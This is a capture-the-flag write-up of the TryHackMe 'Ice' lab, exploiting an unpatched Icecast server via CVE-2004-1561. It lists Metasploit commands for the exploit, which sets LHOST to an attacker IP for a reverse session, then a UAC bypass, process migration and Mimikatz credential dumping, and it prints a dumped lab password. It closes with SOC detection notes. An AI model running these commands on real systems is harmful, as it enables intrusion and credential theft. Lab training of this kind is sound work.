# TryHackMe — Ice (CVE-2004-1561 / Icecast)

> **Category:** Penetration Testing | **Difficulty:** Easy | **Platform:** TryHackMe

---

## Overview

A full attack chain walkthrough of the TryHackMe Ice room, demonstrating exploitation of a vulnerable **Icecast media server** running on a Windows machine. This covers reconnaissance, exploitation via a known CVE, privilege escalation, process migration, and in-memory credential dumping using Mimikatz.

📄 **Full Writeup on Medium:** [Read Here](https://medium.com/@rajeesh8214/tryhackme-ice-walkthrough-exploiting-a-vulnerable-icecast-server-1d07e71e86a2)

---

## Attack Flow

| Step | Action | Tool |
|------|--------|------|
| 1 | Full port scan — identified Icecast on port 8000 | Nmap |
| 2 | Identified CVE-2004-1561 (Icecast header vulnerability) | Manual / Metasploit |
| 3 | Exploited Icecast service | Metasploit |
| 4 | Gained Meterpreter session | Metasploit |
| 5 | Ran local exploit suggester | Metasploit |
| 6 | Escalated privileges via bypassuac_eventvwr | Metasploit |
| 7 | Migrated to stable process (spoolsv.exe) | Meterpreter |
| 8 | Loaded Kiwi (Mimikatz) and dumped credentials | Meterpreter / Kiwi |

---

## Commands Used

**Reconnaissance**
```bash
nmap -p- -sV -sC -T4 <target_ip>
```

**Exploitation**
```bash
msfconsole
use exploit/windows/http/icecast_header
set RHOSTS <target_ip>
set LHOST <attacker_ip>
run
```

**Privilege Escalation**
```bash
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_eventvwr
set SESSION <session_id>
run
```

**Process Migration**
```bash
migrate -N spoolsv.exe
```

**Credential Dumping**
```bash
load kiwi
creds_all
```

---

## Key Findings

- Target: Windows machine running Icecast 2.0.1 (unpatched)
- Vulnerability: CVE-2004-1561 — HTTP header overflow in Icecast
- Privilege escalation: UAC bypass via Event Viewer (`bypassuac_eventvwr`)
- Process migrated to: `spoolsv.exe` for stability
- Credentials dumped from memory: `Dark : Password01!`

---

## SOC Detection Notes

This attack generates several detectable indicators:

- Unusual HTTP traffic on port 8000 (non-standard service port)
- Exploit traffic matching CVE-2004-1561 signature patterns
- Unexpected process migration (e.g., Meterpreter injecting into `spoolsv.exe`)
- UAC bypass via `eventvwr.exe` — a known LOLBIN abuse technique
- LSASS / in-memory credential access (Mimikatz activity)

**SIEM alerting ideas:** abnormal traffic on high ports, `eventvwr.exe` spawning unexpected child processes, LSASS memory reads, lateral movement using dumped credentials.

---

## Skills Demonstrated

- Network Enumeration (Nmap)
- Vulnerability Identification (CVE-2004-1561)
- Exploitation (Metasploit)
- Privilege Escalation (UAC Bypass)
- Process Migration (Meterpreter)
- In-Memory Credential Dumping (Mimikatz / Kiwi)
- Security Monitoring & Detection (SOC perspective)

---

## Key Takeaway

> Outdated services running on non-standard ports are easy to overlook — and easy to exploit.

Service enumeration isn't just a recon step. Finding something like Icecast on port 8000 is a signal to dig deeper. Known CVEs on unpatched software are low-hanging fruit for any attacker.

---

*Part of my ongoing TryHackMe writeup series. More rooms coming soon.*
